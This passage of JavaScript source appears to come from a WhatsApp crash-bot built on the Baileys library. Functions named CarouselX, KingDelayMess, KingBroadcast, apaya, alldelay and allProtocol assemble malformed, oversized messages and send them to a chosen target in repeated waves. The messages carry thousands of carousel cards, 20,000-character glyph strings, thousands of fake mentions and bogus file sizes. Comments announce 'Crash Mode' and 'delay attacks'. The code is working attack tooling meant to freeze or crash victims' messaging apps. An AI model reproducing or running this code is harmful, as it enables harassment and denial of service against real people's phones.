    // ✅ Génère 1020 cartes (pas 1020 * 1020)
    for (let i = 0; i < 1020; i++) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋‌⃟⏤‌‌‌‌‌🖤✦",
          hasMediaAttachment: true,

imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "10840",
            height: 10,
            width: 10,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: ""
          }
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
      });
    }

    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text:` ${"𑜦".repeat(20000)} 🚀 Crash Mode activé\n\u0000 // ⚠️ réduit pour éviter le freeze`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: "YT: https://youtube.com/@richieMods"
              }),
              header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
            })
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, carousel.message, {
      messageId: carousel.key.id,
      participant: { jid: target },
    });

    console.log("✅ CarouselX envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans CarouselX:", err);
  }
}
// === KingDelayMess ===
async function KingDelayMess(sock, target, Ptcp = true) {
  try {
    // Génération d'une énorme liste de mentions
    const mentions = Array.from({ length: 500 }, () => "15056662003@s.whatsapp.net");

    const payload = {
      ephemeralMessage: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
                fileLength: 9999999999999,
                pageCount: 1316134911,
                mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", "base64"),
                fileName: "kingbadboi.🩸KNUT",
                fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", "base64"),
                mediaKeyTimestamp: 1726867151,
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐃𝐄𝐋𝐀𝐘‌⃟⏤‌‌‌‌‌🖤✦",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "KNUT CHANNEL",
                    url: "https://youtube.com/@iqbhalkeifer25"
                  })
                }
              ]
            },
            contextInfo: {
              mentionedJid: mentions // ✅ vraie liste de mentions
            }
          })
        }
      }
    };

    // Génération d’un vrai message WAMessage
    const msg = generateWAMessageFromContent(target, payload, {});

    // Envoi
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      ...(Ptcp ? { participant: { jid: target } } : {})
    });

console.log("✅ KingDelayMess envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans KingDelayMess:", err);
  }
}
// === KingBroadcast ===
async function KingBroadcast(sock, target, mention = true) {
  try {
    // Génère 5000 mentions (plutôt que 20000 d’un seul coup)
    const mentions = Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    // Génération sections limitées (sinon crash direct)
    const delaymention = Array.from({ length: 50 }, (_, r) => ({
      title: "𑇂".repeat(200), // 200 symboles par titre
      rows: [{ title: `📡 Broadcast ${r + 1}, id: ${r + 1} `}]
    }));

    const MSG = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓‌⃟⏤‌‌‌‌‌🖤✦",
            listType: 2,
            buttonText: "⚡ KNUT ⚡",
            sections: delaymention,
            singleSelectReply: { selectedRowId: "🔴" },
            contextInfo: {
              mentionedJid: mentions,
              remoteJid: "status@broadcast",
            }
          }
        }
      }
    };

    // Génération WAMessage
    const msg = generateWAMessageFromContent(target, MSG, {});

    // Envoi broadcast
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    // Si mention activée → envoi supplémentaire
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: { key: msg.key, type: 25 }
            }
          }
        },
        { messageId: msg.key.id }
      );
    }

    console.log("✅ KingBroadcast envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans KingBroadcast:", err);
  }
}
// === All Delay Attacks Optimisé ===
async function alldelay(sock, target, loops = 30, pause = 1500) {
  const start = Date.now();

  for (let i = 0; i < loops; i++) {
    try {
      // Attaques variées
      await DelayInvisNew(sock, target);
      await superdelayinvid(sock, target);
      await delayCrash(sock, [target], false);
      await KingBroadcast(sock, target, true);
      await KingDelayMess(sock, target, true);

      console.log(`⚡ Vague ${i + 1}/${loops} envoyée sur ${target}`);

      // Pause entre chaque vague
      await new Promise(res => setTimeout(res, pause));
    } catch (err) {
      console.error("❌ Erreur dans alldelay:", err);
    }
  }

  const end = Date.now();
  const seconds = ((end - start) / 1000).toFixed(2);

  console.log(`✅ alldelay terminé pour: ${target} en ${seconds}s`);
}
// === Apaya (Newsletter Flood) ===
async function apaya(sock, target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName:
              "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇‌⃟⏤‌‌‌‌‌🖤✦" + "ê¦¾".repeat(20000), // assez pour flood mais pas bloquer ton bot
            jpegThumbnail: Buffer.from(""), // ⚠️ doit être un buffer (met une image en base64 si tu veux un vrai thumb)
            caption: "ê¦½".repeat(20000),
            inviteExpiration: Date.now() + 1814400000, // 21 jours
          },
        },
      },
    };

    // Construction du message via Baileys
    const msg = generateWAMessageFromContent(target, message, {});

    // Envoi
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
    });

    console.log(`✅ Apaya flood envoyé sur ${target}`);
  } catch (err) {
    console.error("❌ Erreur dans apaya:", err);
  }
}
// === All Protocol Flood ===
async function allProtocol(sock, target, loops = 20) {
  const start = Date.now();

  for (let i = 0; i < loops; i++) {
    try {
      // Delay bugs
      await DelayInvisNew(sock, target);
      await superdelayinvid(sock, target);
      await delayCrash(sock, [target], false, 300);

      // Bulldozer
      await bulldozer(sock, target);

// Protocol bugs 1 -> 8
      await protocolbug1(sock, target, true);
      await protocolbug2(sock, target, true);
      await protocolbug3(sock, target, true);
      await protocolbug6(sock, target, true);
      await protocolbug7(sock, target, true);
      await protocolbug8(sock, target, true);

      // King broadcast & King delay
      await KingBroadcast(sock, target, true);
      await KingDelayMess(sock, target, true);

      // Pause entre chaque loop (éviter self-crash)
      await new Promise(res => setTimeout(res, 500));

    } catch (err) {
      console.error("❌ Erreur dans allProtocol:", err);
    }
  }

  const end = Date.now();
  const seconds = ((end - start) / 1000).toFixed(2);

  console.log(`✅ allProtocol terminé pour: ${target} en ${seconds}s`);

}

export default { allProtocol, alldelayKing, DelayMess, CarouselX, carousels2, protocolbug7, protocolbug6, protocolbug8, protocolbug3, protocolbug2, protocolbug1, bulldozercall, Home, thunderblast_ios1, Loc, delayCrash, DelayInvisNew, xUi, bug3, bug2, test, apaya };


